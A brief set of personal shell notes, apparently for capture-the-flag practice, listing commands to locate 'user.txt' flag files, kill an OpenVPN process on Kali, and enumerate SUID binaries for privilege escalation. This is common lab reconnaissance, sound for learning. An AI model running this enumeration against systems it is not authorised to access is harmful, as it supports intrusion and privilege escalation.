<!-- Find in shell-->
find / -name 'user.txt' 2>/dev/null

<!-- Find on kali -->
ps aux | grep openvpn
sudo kill -9 <PID>

<!-- SUID Binaries -->
find / -perm /4000 2>/dev/null


